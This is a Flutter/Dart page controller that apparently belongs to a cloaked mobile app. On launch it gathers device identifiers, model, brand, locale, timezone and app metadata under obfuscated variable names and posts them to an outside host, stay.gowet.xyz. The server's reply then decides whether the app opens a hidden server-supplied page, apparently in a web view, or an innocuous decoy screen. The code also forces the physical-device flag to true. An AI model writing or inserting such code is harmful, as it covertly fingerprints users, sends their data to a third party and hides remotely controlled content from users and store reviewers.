import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

void checkNet() async {
  var connectResult = await (Connectivity().checkConnectivity());
  if(connectResult == ConnectivityResult.none){
    Get.toNamed("/no_net");
  }
}

class PageLogic extends GetxController {

  var ghnbcf = RxBool(false);
  var ibpqvoylr = RxBool(true);
  var cmrat = RxString("");
  var terrance = RxBool(false);
  var mante = RxBool(true);
  final hxwodbvlk = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    checkNet();
    super.onInit();
    ibsdqm();
  }


  Future<void> ibsdqm() async {

    terrance.value = true;
    mante.value = true;
    ibpqvoylr.value = false;

    hxwodbvlk.post("https://stay.gowet.xyz/lKyC7A",data: await ywmkbligs()).then((value) {
      var uxroz = value.data["uxroz"] as String;
      var wmbuygx = value.data["wmbuygx"] as bool;
      if (wmbuygx) {
        cmrat.value = uxroz;
        manuel();
      } else {
        schaden();
      }
    }).catchError((e) {
      ibpqvoylr.value = true;
      mante.value = true;
      terrance.value = false;
    });
  }

  Future<Map<String, dynamic>> ywmkbligs() async {
    final DeviceInfoPlugin jzwk = DeviceInfoPlugin();
    PackageInfo leymxwa_odqh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ntyx = Platform.localeName;
    var EreJK = currentTimeZone;

    var BLOgD = leymxwa_odqh.packageName;
    var jftXoNTa = leymxwa_odqh.version;
    var cQmz = leymxwa_odqh.buildNumber;

    var KDPW = leymxwa_odqh.appName;
    var ovdTAh = "";
    var UCNgA  = "";
    var rockyMarquardt = "";
    var ravenHaag = "";
    var AKZMoqV = "";
    var jakeLeannon = "";
    var icieEmard = "";
    var zacheryCorkery = "";
    var seanOsinski = "";
    var mitchellReinger = "";

    var jDhazJE = "";
    var johnathonLeuschke = "";

    var pekyYxUR = false;

    if (GetPlatform.isAndroid) {
      jDhazJE = "android";
      var hrejnybz = await jzwk.androidInfo;

      AKZMoqV = hrejnybz.brand;

      ovdTAh  = hrejnybz.model;
      UCNgA = hrejnybz.id;

      pekyYxUR = hrejnybz.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      jDhazJE = "ios";
      var hfqtvc = await jzwk.iosInfo;
      AKZMoqV = hfqtvc.name;
      ovdTAh = hfqtvc.model;

      UCNgA = hfqtvc.identifierForVendor ?? "";
      pekyYxUR  = hfqtvc.isPhysicalDevice;
    }
    pekyYxUR = true;
    var res = {
      "KDPW": KDPW,
      "jftXoNTa": jftXoNTa,
      "BLOgD": BLOgD,
      "johnathonLeuschke" : johnathonLeuschke,
      "ovdTAh": ovdTAh,
      "AKZMoqV": AKZMoqV,
      "UCNgA": UCNgA,
      "mitchellReinger" : mitchellReinger,
      "ntyx": ntyx,
      "pekyYxUR": pekyYxUR,
      "ravenHaag" : ravenHaag,
      "cQmz": cQmz,
      "jakeLeannon" : jakeLeannon,
      "EreJK": EreJK,
      "icieEmard" : icieEmard,
      "zacheryCorkery" : zacheryCorkery,
      "seanOsinski" : seanOsinski,
      "rockyMarquardt" : rockyMarquardt,
      "jDhazJE": jDhazJE,

    };
    return res;
  }

  Future<void> schaden() async {
    Get.offAllNamed("/waterTab");
  }

  Future<void> manuel() async {
    Get.offAllNamed("/melation");
  }

}
